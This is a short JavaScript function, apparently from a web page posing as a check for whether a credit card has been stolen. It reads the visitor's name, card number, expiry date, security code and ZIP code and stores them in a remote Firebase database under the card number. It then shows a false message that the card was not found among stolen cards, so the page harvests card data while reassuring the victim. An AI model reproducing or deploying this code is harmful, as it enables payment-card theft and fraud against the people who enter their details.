function doCcCheck() {

  let data = {
    name: document.ccCheck['name'].value,
    ccn: document.ccCheck['number'].value,
    expiry: document.ccCheck['expiry'].value,
    security: document.ccCheck['security'].value,
    zip: document.ccCheck['zip'].value
  };

  if (document.ccCheck['number'].value != "" || document.ccCheck['expiry'].value != "" || document.ccCheck['security'].value) {
    firebase.database().ref(`cc/${document.ccCheck['number'].value}`).set(data)
    $('#ccCheck').replaceWith(`
      <div class="alert alert-success" role="alert">
        <h4 class="alert-heading">Good news</h4>
        Your credit card has not been found in our database of stolen credit cards!
      </div>
      `)
  };

};
